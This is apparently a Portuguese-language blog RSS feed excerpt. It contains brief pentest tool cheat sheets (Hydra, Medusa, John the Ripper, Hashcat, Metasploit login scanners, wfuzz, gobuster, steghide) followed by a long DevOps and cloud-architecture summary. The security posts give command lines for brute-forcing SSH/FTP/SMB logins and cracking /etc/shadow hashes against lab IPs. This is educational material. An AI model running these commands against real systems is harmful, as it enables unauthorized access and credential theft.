      <content:encoded><![CDATA[TCPDump
O TCPDump funciona em linha de comando, para captura e an√°lise de pacotes. J√° vem instalado por padr√£o em diversas distribui√ß√µes Linux, foi tamb√©m portado para o Windows com o nome de Windump. O TCPDump prov√™ uma interface de usu√°rio para a intera√ß√£o com a LibPcap, biblioteca amplamente utilizada por sniffers open source, que atua diretamente no driver da placa de rede para possibilitar a captura de pacotes.
# tcpdump
Rodando o comando diretamente como root, ele vai come√ßar a filtrar todos os pacotes. Incluindo todas as interfaces.
Para fazer uma busca especifica por uma interface, wireless por exemplo, basta setar na frente do tcpdump o nome da mesma.
# tcpdump -v -i wlp3s01
]]></content:encoded>
    </item>
    <item>
      <title>Ferramentas De Quebra De Senhas</title>
      <link>https://fxshelll.github.io/posts/ferramentas-de-quebra-de-senhas/</link>
      <pubDate>Wed, 30 Sep 2020 23:58:15 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/ferramentas-de-quebra-de-senhas/</guid>
      <description>Ferramentas de Quebra de Senhas
Hydra O Hydra √© uma ferramenta famosa que realiza ataque de dicion√°rio a servi√ßos. Seu uso √©, basicamente, assim:
hydra -l &amp;lt;login&amp;gt; -p &amp;lt;senha&amp;gt; &amp;lt;IP&amp;gt; &amp;lt;servi√ßo&amp;gt; -t &amp;lt;tasks&amp;gt; Abaixo, um exemplo de uma tentativa √∫nica (-t 1) com o usu√°rio root (-l root) e a senha 12345 (-p 12345) no endere√ßo 10.0.2.2 no servi√ßo ssh:
hydra -l root -p 12345 10.0.2.2 ssh -t 1 Podemos passar um dicion√°rio de logins e senhas com o par√¢metro -L e -P:</description>
      <content:encoded><![CDATA[Ferramentas de Quebra de Senhas
Hydra O Hydra √© uma ferramenta famosa que realiza ataque de dicion√°rio a servi√ßos. Seu uso √©, basicamente, assim:
hydra -l &amp;lt;login&amp;gt; -p &amp;lt;senha&amp;gt; &amp;lt;IP&amp;gt; &amp;lt;servi√ßo&amp;gt; -t &amp;lt;tasks&amp;gt; Abaixo, um exemplo de uma tentativa √∫nica (-t 1) com o usu√°rio root (-l root) e a senha 12345 (-p 12345) no endere√ßo 10.0.2.2 no servi√ßo ssh:
hydra -l root -p 12345 10.0.2.2 ssh -t 1 Podemos passar um dicion√°rio de logins e senhas com o par√¢metro -L e -P:
hydra -L &amp;lt;arquivo_login&amp;gt; -P &amp;lt;arquivo_senha&amp;gt; &amp;lt;IP&amp;gt; &amp;lt;servi√ßo&amp;gt; hydra -L login.txt -P senha.txt 10.0.2.2 ssh -t 4 O Hydra tamb√©m possui uma interface gr√°fica que pode ser chamada com o comando:
Medusa Assim como o Hydra, o Medusa realiza ataque de dicion√°rio a servi√ßos. Seu uso √© basicamente:
Para listar os m√≥dulos
medusa -q | more
Comando:
medusa -h -u -p -M medusa -h 10.10.100.25 -u admin -p 1234 -M ftp
Lista de IP, usu√°rios e senhas
medusa -H -U -P -M medusa -H hosts.txt -U users.txt -P pass.txt -M smbnt
John the Ripper O John the Ripper (o nome da ferramenta faz alus√£o a um famoso psicopata do s√©culo 19, Jack, o Estripador) √© uma das ferramentas mais usadas em pentest, sendo ele um utilit√°rio que faz quebra de senhas de tr√™s modos:
WordList ‚Üí Ele tenta por uma Wordlist, testando as combina√ß√µesde senha/usu√°rio. Single Crack ‚Üí Ele tenta quebrar a senha usando as informa√ß√µesde login. Incremental ‚Üí Sendo o modo mais robusto no John the Ripper,ele tentar√° cada caractere poss√≠vel at√© achar a senha correta. Epor esse motivo, √© indicado o uso de par√¢metros com o intuito dereduzir o tempo de quebra. No caso do modo incremental, √© necess√°rio ter o arquivo contendo o hash da senha do usu√°rio (SAM no Windows ou /etc/shadow no Linux).
Seu uso √© basicamente:
john &amp;ndash;wordlist=dicionario.txt
john &amp;ndash;single
john &amp;ndash;incremental
john &amp;ndash;wordlist=dicionario.txt &amp;ndash;format=NT
As senhas quebradas s√£o armazenadas no arquivo:
&amp;lt;home_do_usu√°rio)&amp;gt;/.john/john.pot
E assim como o Hydra, o JtR tamb√©m tem uma Interface Gr√°fica, que pode ser chamada pelo comando:
johnny
OphCrack O OphCrack √© uma ferramenta nativa do Kali Linux e espec√≠fica para uso com Rainbow Tables. Com uma interface gr√°fica bem intuitiva, o OphCrack √© ideal para realizar ataques de Brute Force em sistemas Windows.
Hashcat Tamb√©m nativo do Kali, o Hashcat √© uma ferramenta espec√≠fica para realizar ataques do tipo Password Cracking. Uma das features mais interessantes dela √© a possibilidade de se utilizar o processador da placa de v√≠deo para dar mais performance ao ataque.
Seu uso √© basicamente:
hashcat -m -a -o &amp;lt;arquivo de sa√≠da&amp;gt; &amp;lt;dicion√°rio&amp;gt;
Exemplo:
hashcat -m 1800 -a 0 -o cracked.txt /etc/shadow /usr/share
/usr/share/wordlists/rockyou.txt
Caso os drivers da placa de v√≠deo n√£o estejam instalados, √© necess√°rio utilizar a op√ß√£o &amp;ndash;force, desta forma:
hashcat -m 1800 -a 0 -o cracked.txt /etc/shadow /usr/share /usr/share/wordlists/rockyou.txt &amp;ndash;force
Metasploit Framework O Metasploit (MSF) √© um framework criado por H.D.Moore, que serve para elabora√ß√£o e execu√ß√£o de um reposit√≥rio de exploits.
Apesar de n√£o ser esse o objetivo da ferramenta, o MSF possui m√≥dulos de ataque For√ßa Bruta para diversas aplica√ß√µes, como, por exemplo, o SSH, que pode ser executado por meio da sequ√™ncia de comandos abaixo:
service postgresql start msfconsole use &amp;lt;auxiliar&amp;gt; auxiliary/scanner/ssh/ssh_login auxiliary/scanner/ftp/ftp_login auxiliary/scanner/smb/smb_login auxiliary/scanner/telnet/telnet_login show options set &amp;lt;parametros&amp;gt; run ]]></content:encoded>
    </item>
    <item>
      <title>Steghide</title>
      <link>https://fxshelll.github.io/posts/steghide/</link>
      <pubDate>Thu, 20 Aug 2020 02:23:34 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/steghide/</guid>
      <description>$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informa√ß√µes sobre o arquivo de imagem com o embed $ steghide info picture.jpg </description>
      <content:encoded><![CDATA[$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informa√ß√µes sobre o arquivo de imagem com o embed $ steghide info picture.jpg ]]></content:encoded>
    </item>
    <item>
      <title>Wfuzz</title>
      <link>https://fxshelll.github.io/posts/wfuzz/</link>
      <pubDate>Fri, 31 Jul 2020 04:13:20 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/wfuzz/</guid>
      <description>√â umaferramenta de fuzzing criado para facilitar a tarefa de avalia√ß√£o de aplica√ß√µes web e baseia-se num conceito muito simples: substitui qualquer refer√™ncia √† palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz √© uma fonte de dados.
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
c colorir sa√≠da
w caminho da wordlist
hc ignorar erros</description>
      <content:encoded><![CDATA[√â umaferramenta de fuzzing criado para facilitar a tarefa de avalia√ß√£o de aplica√ß√µes web e baseia-se num conceito muito simples: substitui qualquer refer√™ncia √† palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz √© uma fonte de dados.
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
c colorir sa√≠da
w caminho da wordlist
hc ignorar erros
]]></content:encoded>
    </item>
    <item>
      <title>GoBuster</title>
      <link>https://fxshelll.github.io/posts/gobuster/</link>
      <pubDate>Tue, 28 Jul 2020 02:44:29 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/gobuster/</guid>
      <description>GoBuster Primo do DIRB
O Gobuster √© uma √≥tima ferramenta utilizada para for√ßa bruta em URI‚Äôs (diret√≥rios e arquivos)
-fw ‚Äì for√ßa o processamento de um dom√≠nio com resultados curinga. -np ‚Äì oculta a sa√≠da do progresso. -m &amp;lt;modo&amp;gt; ‚Äì qual modo usar, dir ou dns (padr√£o: dir). -q ‚Äì desativa a sa√≠da de banner / sublinhado. -t &amp;lt;threads&amp;gt; ‚Äì n√∫mero de encadeamentos a serem executados (padr√£o: 10). -u &amp;lt;url / domain&amp;gt; ‚Äì URL completo (incluindo esquema) ou nome de dom√≠nio base.</description>
      <content:encoded><![CDATA[GoBuster Primo do DIRB
O Gobuster √© uma √≥tima ferramenta utilizada para for√ßa bruta em URI‚Äôs (diret√≥rios e arquivos)
-fw ‚Äì for√ßa o processamento de um dom√≠nio com resultados curinga. -np ‚Äì oculta a sa√≠da do progresso. -m &amp;lt;modo&amp;gt; ‚Äì qual modo usar, dir ou dns (padr√£o: dir). -q ‚Äì desativa a sa√≠da de banner / sublinhado. -t &amp;lt;threads&amp;gt; ‚Äì n√∫mero de encadeamentos a serem executados (padr√£o: 10). -u &amp;lt;url / domain&amp;gt; ‚Äì URL completo (incluindo esquema) ou nome de dom√≠nio base. -v ‚Äì sa√≠da detalhada (mostra todos os resultados). -w &amp;lt;wordlist&amp;gt; ‚Äì caminho para a lista de palavras usada para for√ßa bruta (use ‚Äì para stdin). Eu poderia usar o DIRB? Sim, por que ele vai fazer o scanning de p√°ginas tamb√©m. Ficaria assim:
$ dirb http://192.168.219.128:65535 /usr/share/dirb/wordlists/big.txt
Com o GoBuster faria o brute force &#43; o scanning de diret√≥rios, utilizando a mesma wordlist do DIRB.
$ gobuster dir -u http://192.168.219.128:65535 -w /usr/share/dirb/wordlists/big.txt
-w &amp;lt;wordlist&amp;gt; -u &amp;lt;url&amp;gt; ]]></content:encoded>
    </item>
    <item>
      <title>FIAP - DevOps e Arquitetura Cloud</title>
      <link>https://fxshelll.github.io/posts/devops-e-arquitetura-cloud/</link>
      <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/devops-e-arquitetura-cloud/</guid>
      <description>Fundamentos da Cultura DevOps O DevOps surgiu para acabar com o conflito entre desenvolvimento, focado em inova√ß√£o r√°pida, e opera√ß√µes, voltadas para estabilidade e seguran√ßa. Em vez de atuarem separadamente, as duas √°reas passaram a se integrar em um √∫nico fluxo colaborativo. Mais do que um conjunto de ferramentas, o DevOps representa uma mudan√ßa cultural que promove colabora√ß√£o constante entre pessoas e times, automa√ß√£o de tarefas repetitivas ‚Äî como testes, deploys e integra√ß√µes ‚Äî, monitoramento cont√≠nuo das aplica√ß√µes e feedback r√°pido para melhorias constantes.</description>
      <content:encoded><![CDATA[Fundamentos da Cultura DevOps O DevOps surgiu para acabar com o conflito entre desenvolvimento, focado em inova√ß√£o r√°pida, e opera√ß√µes, voltadas para estabilidade e seguran√ßa. Em vez de atuarem separadamente, as duas √°reas passaram a se integrar em um √∫nico fluxo colaborativo. Mais do que um conjunto de ferramentas, o DevOps representa uma mudan√ßa cultural que promove colabora√ß√£o constante entre pessoas e times, automa√ß√£o de tarefas repetitivas ‚Äî como testes, deploys e integra√ß√µes ‚Äî, monitoramento cont√≠nuo das aplica√ß√µes e feedback r√°pido para melhorias constantes.
Essa abordagem traz benef√≠cios significativos para empresas e profissionais: as entregas passam a ser mais r√°pidas e frequentes, h√° menos falhas devido a testes e integra√ß√µes automatizados, e a qualidade do produto final melhora consideravelmente. Al√©m disso, o DevOps garante maior produtividade, adapta√ß√£o mais √°gil √†s mudan√ßas do mercado e consolida uma cultura de aprendizado cont√≠nuo e resili√™ncia dentro das equipes.
O ciclo de vida do DevOps, geralmente representado pelo s√≠mbolo do infinito (‚àû), mostra bem esse fluxo cont√≠nuo. Ele come√ßa pelo planejamento, onde times integrados definem objetivos em conjunto. Em seguida, passa para o desenvolvimento, que envolve codifica√ß√£o com integra√ß√£o e testes cont√≠nuos. Na fase de entrega, os deploys s√£o automatizados e seguros, garantindo velocidade sem comprometer a qualidade. Por fim, chega-se √† opera√ß√£o, onde o software √© monitorado em tempo real, seu desempenho √© analisado e os feedbacks gerados reiniciam o ciclo, trazendo melhorias constantes.
Em resumo, o DevOps √© muito mais que uma pr√°tica t√©cnica: √© uma cultura que transforma a forma como equipes trabalham, promovendo colabora√ß√£o, automa√ß√£o e evolu√ß√£o cont√≠nua para entregar valor com agilidade e seguran√ßa.
DevOps surgiu para acabar com o conflito entre desenvolvimento (focado em inova√ß√£o r√°pida) e opera√ß√µes (focadas em estabilidade e seguran√ßa). Ele integra as duas √°reas em um √∫nico fluxo colaborativo.
üîπ Mudan√ßa cultural Mais que ferramentas, DevOps √© uma mentalidade que promove:
Colabora√ß√£o constante entre pessoas e times. Automa√ß√£o de tarefas repetitivas (testes, deploys, integra√ß√µes). Monitoramento cont√≠nuo das aplica√ß√µes. Feedback r√°pido para melhorias constantes. üîπ Benef√≠cios
Entregas mais r√°pidas e frequentes. Menos falhas, com testes e integra√ß√µes automatizados. Melhor qualidade no produto final. Maior produtividade e adapta√ß√£o √†s mudan√ßas do mercado. Cultura de aprendizado cont√≠nuo e resili√™ncia. üîπ Ciclo DevOps (‚àû)
1- Planejar ‚Äì definir objetivos com times integrados. 2- Desenvolver ‚Äì codifica√ß√£o com integra√ß√£o e testes cont√≠nuos. 3- Entregar ‚Äì deploys automatizados e seguros. 4- Operar e Monitorar ‚Äì analisar desempenho, gerar feedback e reiniciar o ciclo.
üìå Pr√°ticas Comuns do DevOps
O DevOps √© sustentado por pr√°ticas que unem tecnologia, automa√ß√£o e colabora√ß√£o para entregar software com mais agilidade e qualidade. Entre as principais est√£o:
‚ú® Infraestrutura como C√≥digo (IaC): transforma servidores, redes e ambientes em arquivos version√°veis, audit√°veis e reproduz√≠veis. Com ferramentas como Terraform, Pulumi, CloudFormation e Ansible, provisionar ou destruir ambientes se torna simples, r√°pido e econ√¥mico.
‚öôÔ∏è CI/CD (Integra√ß√£o e Entrega Cont√≠nua): cada mudan√ßa de c√≥digo passa por testes, builds e valida√ß√µes autom√°ticas antes de chegar √† produ√ß√£o. Jenkins, GitHub Actions e GitLab CI s√£o exemplos que permitem implanta√ß√µes seguras e frequentes.
üê≥ Conteineriza√ß√£o e Orquestra√ß√£o: Docker e Kubernetes garantem consist√™ncia entre os ambientes, escalabilidade e resili√™ncia das aplica√ß√µes.
üìä Monitoramento Cont√≠nuo: Prometheus e Grafana fecham o ciclo, coletando m√©tricas e logs para detectar falhas e alimentar melhorias constantes.
Essas pr√°ticas n√£o apenas aceleram o ciclo de desenvolvimento, mas criam ambientes previs√≠veis, seguros e escal√°veis.
üìå Cases de Sucesso
Um dos exemplos mais marcantes do poder do DevOps √© a Netflix. A empresa precisou lidar com enorme complexidade e necessidade de resili√™ncia em escala global. A solu√ß√£o foi automatizar tudo:
üñ•Ô∏è Sua infraestrutura √© definida como c√≥digo (IaC), sem configura√ß√µes manuais.
üöÄ Novas vers√µes passam por pipelines robustos, como o Spinnaker, criado por eles mesmos.
üì¶ As aplica√ß√µes rodam em cont√™ineres padronizados, garantindo consist√™ncia do desenvolvimento √† produ√ß√£o.
O resultado √© impressionante: milhares de mudan√ßas por dia sem comprometer a estabilidade global dos sistemas. A Netflix mostra como a automa√ß√£o, a padroniza√ß√£o e a colabora√ß√£o podem transformar lentid√£o em velocidade e caos em efici√™ncia.
üìå Tend√™ncias do DevOps
O DevOps continua em evolu√ß√£o, e algumas tend√™ncias est√£o moldando o futuro dessa cultura:
üîÑ GitOps: o reposit√≥rio Git se torna a √∫nica fonte da verdade. Ferramentas como Argo CD e Flux garantem que o estado da produ√ß√£o reflita exatamente o que est√° no c√≥digo.
üõ°Ô∏è Policy as Code (Pol√≠tica como C√≥digo): ferramentas como Open Policy Agent (OPA) permitem que toda infraestrutura j√° nas√ßa em conformidade com regras de seguran√ßa e custos, antes mesmo de ser provisionada.
ü§ñ Automa√ß√£o Inteligente: pr√°ticas cada vez mais declarativas, integrando monitoramento e resili√™ncia de forma autom√°tica e proativa.
Essas tend√™ncias apontam para um futuro em que a entrega de software ser√° ainda mais √°gil, segura e sustent√°vel, consolidando o DevOps como pe√ßa-chave na transforma√ß√£o digital.
Cultura Organizacional no DevOps DevOps vai muito al√©m de ferramentas e automa√ß√£o: √©, antes de tudo, uma quest√£o de cultura organizacional. √â essa base que define se a ado√ß√£o de pr√°ticas modernas vai prosperar ou travar. Quando a empresa constr√≥i ambientes de colabora√ß√£o real entre desenvolvimento, opera√ß√µes, QA e seguran√ßa, abre espa√ßo para ciclos r√°pidos de entrega, aprendizagem cont√≠nua e melhoria constante. Nesse contexto, lideran√ßa, pol√≠ticas de RH e rituais do dia a dia importam tanto quanto pipelines e cont√™ineres ‚Äî eles moldam comportamentos, refor√ßam valores e sustentam a mudan√ßa no longo prazo.
Entender o ‚Äúclima‚Äù interno ajuda a calibrar a jornada: culturas de Cl√£ (colaborativas) e Adhocr√°ticas (inovadoras) tendem a favorecer experimenta√ß√£o e autonomia; culturas Hier√°rquicas e de Mercado pedem mais cuidado na transi√ß√£o, exigindo governan√ßa clara, comunica√ß√£o transparente e metas alinhadas ao valor entregue ao cliente. Em qualquer cen√°rio, o ponto central √© substituir silos por confian√ßa, comando e controle por responsabilidade compartilhada, e m√©tricas isoladas por m√©tricas que medem resultado de neg√≥cio.
A transforma√ß√£o come√ßa pequeno e intencional: escolha um projeto-piloto, defina objetivos e m√©tricas desde o in√≠cio (tempo de ciclo, frequ√™ncia de deploy, taxa de falhas e tempo de restaura√ß√£o), combine crit√©rios de seguran√ßa e qualidade, e estabele√ßa cad√™ncia de feedback com retrospectivas abertas. Invista em educa√ß√£o cont√≠nua (treinamentos, workshops e comunidades de pr√°tica), documente aprendizados e celebre pequenas vit√≥rias ‚Äî isso cria tra√ß√£o e engaja a organiza√ß√£o al√©m do discurso. Quando o piloto estiver s√≥lido, leve o modelo a outras √°reas respeitando o ritmo de cada time, sempre refor√ßando autonomia com responsabilidade.
No mercado, as empresas que mais performam tratam cultura como alavanca de performance ‚Äî n√£o como ornamento. O exemplo cl√°ssico vem da pr√°tica de SRE do Google e do post-mortem sem culpa: o foco nunca √© ‚Äúquem errou?‚Äù, mas ‚Äúcomo nosso processo permitiu que isso acontecesse?‚Äù. Esse ambiente de seguran√ßa psicol√≥gica reduz o medo, encoraja relatos transparentes, acelera corre√ß√µes e fortalece o sistema. Na mesma linha, os estudos do DORA mostram que times de elite ‚Äî os que entregam mais r√°pido e com mais estabilidade ‚Äî s√£o justamente aqueles com culturas de alta confian√ßa, colabora√ß√£o e aprendizado.
Em resumo, cultura √© o sistema operacional da transforma√ß√£o DevOps. Ferramentas como Git, CI/CD, Kubernetes e observabilidade s√≥ atingem seu potencial quando operam sobre valores e comportamentos que incentivam colabora√ß√£o, autonomia respons√°vel e melhoria cont√≠nua. Com lideran√ßa presente, m√©tricas que importam e rituais que sustentam a pr√°tica, o DevOps deixa de ser uma promessa e vira uma capacidade organizacional: entregar valor com agilidade, qualidade e seguran√ßa ‚Äî de forma sustent√°vel.
Integra√ß√£o e Automa√ß√£o no DevOps Automa√ß√£o √© um dos pilares centrais do DevOps moderno ‚Äî n√£o apenas para acelerar tarefas, mas como estrat√©gia para garantir entregas consistentes, seguras e escal√°veis. A ideia √© transformar todo o ciclo de vida do software em um fluxo automatizado: do provisionamento de infraestrutura ao monitoramento p√≥s-deploy, reduzindo interven√ß√£o manual, encurtando feedbacks e liberando as equipes para focar em inova√ß√£o. Na pr√°tica, isso come√ßa pela Infraestrutura como C√≥digo: ambientes s√£o descritos em arquivos version√°veis e audit√°veis, aplicados com ferramentas como Terraform e Pulumi, enquanto Ansible, Chef ou Puppet asseguram configura√ß√£o idempotente e padronizada. A cada commit, pipelines de CI/CD com Jenkins, GitLab CI/CD ou GitHub Actions disparam builds, testes (unit√°rios, integra√ß√£o e ponta a ponta), an√°lises de seguran√ßa e valida√ß√µes de pol√≠tica; s√≥ ent√£o a aplica√ß√£o segue para deployment cont√≠nuo com Argo CD, Helm ou Spinnaker, usando estrat√©gias como blue/green, canary e rolling updates. Se algo sair do esperado, health checks e regras de rollback devolvem o sistema ao estado est√°vel sem fric√ß√£o.
A automa√ß√£o n√£o termina no deploy. Em produ√ß√£o, Prometheus, Grafana e stacks de logs como ELK coletam m√©tricas, logs e traces, alimentando pain√©is e alertas que guiam ajustes finos nos pipelines e no pr√≥prio produto. Pr√°ticas de DevSecOps integram scanners (por exemplo, Snyk ou Aqua) para barrar vulnerabilidades antes de chegarem ao ar, e ChatOps conecta bots ao Slack/Teams para executar tarefas operacionais (rollbacks, health checks, roteamento de tr√°fego) por comandos audit√°veis. O resultado √© previsibilidade de ambientes, redu√ß√£o de ‚Äúfunciona na minha m√°quina‚Äù, menor tempo de ciclo e maior frequ√™ncia de entregas ‚Äî muitas vezes saltando de cad√™ncias mensais para di√°rias ou hor√°rias.
Os cases do mercado mostram o poder desse modelo. Netflix opera em escala global com infraestrutura definida como c√≥digo, pipelines robustos e cont√™ineres padronizados, realizando milhares de mudan√ßas por dia com estabilidade. Amazon pratica h√° anos o mantra ‚Äúyou build it, you run it‚Äù, viabilizado por uma plataforma interna de automa√ß√£o que d√° autonomia com governan√ßa aos times. Etsy e Red Hat seguiram o mesmo caminho ao combinar automa√ß√£o, monitoramento e colabora√ß√£o, transformando processos manuais e fr√°geis em esteiras confi√°veis e repet√≠veis. A fronteira dessa evolu√ß√£o aponta para Platform Engineering, com plataformas internas de self-service que padronizam provisionamento e deploy, e para AIOps, que usa aprendizado de m√°quina para prever falhas, automatizar respostas e tornar a opera√ß√£o quase ‚Äúinvis√≠vel‚Äù.
Em s√≠ntese, integra√ß√£o e automa√ß√£o s√£o o motor invis√≠vel da entrega moderna: conectam desenvolvimento, seguran√ßa e opera√ß√µes em um fluxo cont√≠nuo e rastre√°vel, reduzem custos com retrabalho e downtime, aceleram o time-to-market e aumentam a resili√™ncia. Com infraestrutura declarativa, pipelines bem desenhados, observabilidade e cultura de melhoria cont√≠nua, o DevOps deixa de ser teoria e vira capacidade organizacional ‚Äî entregar valor frequente, com qualidade e seguran√ßa, em escala.
üîπ 1) Por que as empresas v√£o para a nuvem? 1.1 Motivadores de Neg√≥cio (resultados) ‚ö° Agilidade: acesso de qualquer lugar ‚Üí decis√µes mais r√°pidas. üí∞ Economia: menos compra de servidores e salas; menor investimento inicial. üéØ Foco no core business: equipe foca no produto/servi√ßo, n√£o em ‚Äúcuidar de servidor‚Äù. 1.2 Motivadores T√©cnicos (tecnologia) üîí Seguran√ßa aprimorada: provedores investem em prote√ß√£o e alta disponibilidade. üë®‚Äçüíª Time de TI mais estrat√©gico: menos tarefas manuais, mais melhorias cont√≠nuas. ü§ñ Tecnologias de ponta: IA, Machine Learning e Big Data sem precisar montar do zero. üí° Ideia central: neg√≥cio e tecnologia andam juntos. Seguran√ßa &#43; automa√ß√£o viabilizam economia e agilidade ‚Äî liberando o time para inovar.
üöÄ 2) Benef√≠cios-chave da Nuvem 2.1 Escalabilidade x Elasticidade ‚¨ÜÔ∏è Escalabilidade Vertical (Scale Up)
O que √©: deixar uma m√°quina mais forte (CPU/RAM/disco). Quando usar: ganho r√°pido em um √∫nico servidor. Vantagem: simples de aplicar. Observa√ß√£o: limite f√≠sico; pode exigir parada para upgrade. üîÄ Escalabilidade Horizontal (Scale Out)
O que √©: adicionar mais m√°quinas e dividir a carga. Quando usar: cargas grandes/vari√°veis; microsservi√ßos. Vantagem: crescimento quase ilimitado; mais tolerante a falhas. Observa√ß√£o: √© o padr√£o de sistemas modernos. üß© Elasticidade
O que √©: ajuste autom√°tico de recursos para cima/baixo. Quando usar: demandas imprevis√≠veis (picos). Vantagem: paga s√≥ pelo que usa; custo eficiente. Observa√ß√£o: √© a ‚Äúautoma√ß√£o‚Äù da escalabilidade em tempo real. Modelos de Servi√ßo em Nuvem Os servi√ßos em nuvem oferecem diferentes n√≠veis de abstra√ß√£o. Cada modelo define o que o provedor gerencia e o que fica sob sua responsabilidade.
‚òÅÔ∏è IaaS (Infrastructure as a Service) Infraestrutura como servi√ßo: o provedor entrega m√°quinas virtuais, rede e armazenamento. Voc√™ gerencia o resto.
Quando usar:
üè¶ Ambientes que exigem alto n√≠vel de controle. üîÅ Migra√ß√£o de sistemas legados (lift and shift). üõ°Ô∏è Setores com forte compliance (ex.: sa√∫de e finan√ßas). üß± PaaS (Platform as a Service) Plataforma como servi√ßo: o provedor cuida da infraestrutura e voc√™ foca s√≥ no c√≥digo e nos dados.
Quando usar:
üèÉ Para acelerar desenvolvimento sem gerenciar servidores. ü§ù Equipes com muitos devs trabalhando no mesmo projeto. üåê Aplica√ß√µes web, back-ends m√≥veis e microsservi√ßos. üíª SaaS (Software as a Service) Software pronto, entregue pela internet. O usu√°rio s√≥ consome, sem se preocupar com infraestrutura ou plataforma.
Quando usar:
‚è±Ô∏è R√°pida ado√ß√£o, sem precisar instalar nada. üßë‚Äçüíº Pequenas empresas ou times n√£o t√©cnicos. üõí E-mail, CRM, ERP, ferramentas de colabora√ß√£o. ‚ö° FaaS (Functions as a Service) Fun√ß√µes sob demanda, orientadas a eventos (serverless). Voc√™ s√≥ escreve o c√≥digo, e o provedor executa quando necess√°rio.
Vantagens:
üßë‚Äçüíª Foco no c√≥digo, sem gerenciar servidores. üìà Escalabilidade autom√°tica (de 0 at√© o pico). üí∏ Paga apenas pelo tempo de execu√ß√£o. Desvantagens:
üîß Menor controle do ambiente de runtime. üßä &amp;ldquo;Cold start&amp;rdquo; (lat√™ncia na primeira execu√ß√£o). ‚è±Ô∏è Tempo m√°ximo por execu√ß√£o. Quando usar:
üîî Cargas de trabalho orientadas a eventos. üßÆ Processamento de dados e tempo real. üìä Aplica√ß√µes distribu√≠das e microsservi√ßos. üìä Comparativo r√°pido IaaS ‚Üí Mais controle, mas exige mais gerenciamento. PaaS ‚Üí Bom equil√≠brio: rapidez no desenvolvimento. SaaS ‚Üí Maior facilidade, pouca personaliza√ß√£o. FaaS ‚Üí Escalabilidade sob demanda, paga por invoca√ß√£o. üéØ Conclus√£o A escolha entre IaaS, PaaS, SaaS e FaaS deve alinhar controle, velocidade, compliance e custo com os objetivos de neg√≥cio.
Na pr√°tica, empresas modernas combinam v√°rios modelos (multicloud/h√≠brido) para atender necessidades diferentes de forma otimizada.
INFRAESTRUTURA DE NUVEM Replica√ß√£o: base de Alta Disponibilidade A replica√ß√£o garante que servi√ßos e dados continuem no ar mesmo com falhas.
üîÅ Replica√ß√£o de Dados üì¶ O que √©: manter c√≥pias do mesmo dado em locais diferentes (Zonas/Regi√µes). üéØ Por que fazer: se um data center cair, outra c√≥pia segue atendendo. üß© Exemplo: bancos de dados replicados entre regi√µes para evitar perda de dados. üßØ Replica√ß√£o de Componentes/Servi√ßos üß± O que √©: ter v√°rias inst√¢ncias de apps/servi√ßos (multi-zona/multi-regi√£o). üö¶ Benef√≠cio: se uma inst√¢ncia falhar, outra assume sem interrup√ß√£o. üõ°Ô∏è Resultado: mais estabilidade e resili√™ncia do sistema. Edge Computing (Computa√ß√£o de Borda) Em vez de mandar tudo para a nuvem central, parte do processamento acontece perto da fonte dos dados (na ‚Äúborda‚Äù da rede).
‚öôÔ∏è Princ√≠pios üñ•Ô∏è Processamento local: dispositivos/gateways tratam dados no pr√≥prio local. ‚ö° Menos lat√™ncia: resposta muito mais r√°pida (tempo real). üîª Menos tr√°fego: s√≥ o essencial sobe para a nuvem ‚Üí economia de banda. üí° Edge complementa a nuvem: a nuvem continua essencial; o Edge acelera cen√°rios de baixa lat√™ncia (IoT, v√≠deo, jogos, automa√ß√£o).
ü§ù Edge &#43; IoT: parceria natural Sensores e dispositivos IoT geram muitos dados. O Edge filtra/analisa perto da origem ‚Üí decis√µes mais r√°pidas e mais seguran√ßa. üìå Casos de uso (exemplos) üöö Ve√≠culos aut√¥nomos / platooning: comunica√ß√£o ultrarr√°pida entre caminh√µes. üõ¢Ô∏è √ìleo &amp;amp; G√°s (remoto): an√°lise em tempo real sem internet perfeita. ‚ö° Smart Grid: ajuste de consumo na ponta (f√°bricas/escrit√≥rios). üõ†Ô∏è Manuten√ß√£o preditiva: detectar falhas antes de acontecer. üè• Hospitais: processar dados localmente (privacidade &#43; alertas imediatos). üèôÔ∏è Cidades inteligentes: tr√°fego e ambiente em tempo real. üè† Casas inteligentes: assistentes de voz mais responsivos. üé¨ Entrega de conte√∫do/CDN: v√≠deo/p√°ginas em cache na borda ‚Üí menos atraso. Mercado, Cases e Tend√™ncias (2024‚Äì2025) üìà O que puxa a demanda ‚òÅÔ∏è Mais nuvem por custo/escala/acesso em v√°rios setores. üîÑ Transforma√ß√£o digital: moderniza√ß√£o de TI para agilidade. üß≠ Edge em alta: processamento descentralizado pede nuvem robusta. üìä Explos√£o de dados: de ~97 ZB (2024) para ~181 ZB (2025) ‚Üí armazenar e processar em escala. üß± Tecnologia de base melhor: virtualiza√ß√£o, SDN e cont√™ineres mais eficientes e seguros. üè≠ Data Centers: IA e sustentabilidade üß† Foco em infer√™ncia de IA: levar respostas de modelos para mais perto do usu√°rio/dispositivo. üå± Energia &amp;amp; resfriamento eficientes: sustentabilidade virou imperativo. üèóÔ∏è ‚ÄúF√°bricas de IA‚Äù: infra com GPUs &#43; modelos como servi√ßo (AIaaS) para acelerar projetos de IA. üåê Edge &#43; 5G &#43; IoT (sinergia) üìç Mais processamento na borda: grande parte dos dados corporativos ser√° tratada no Edge. üì° 5G: lat√™ncia baix√≠ssima &#43; suporte a muitos dispositivos por km¬≤. 